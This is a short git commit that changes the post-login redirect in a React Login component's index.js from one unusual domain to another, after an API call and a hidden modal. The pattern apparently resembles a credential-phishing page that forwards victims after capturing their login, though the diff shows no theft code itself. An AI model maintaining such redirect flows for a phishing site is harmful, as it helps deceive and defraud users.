889d7ffc942438d0ea17cf18501c7c453713ab0e
husknet <127146284+husknet@users.noreply.github.com>
2025-03-11 15:11:44 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://kr.fregate.shop/';
+      window.location.href = 'https://kr.moralemadefiles.top/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
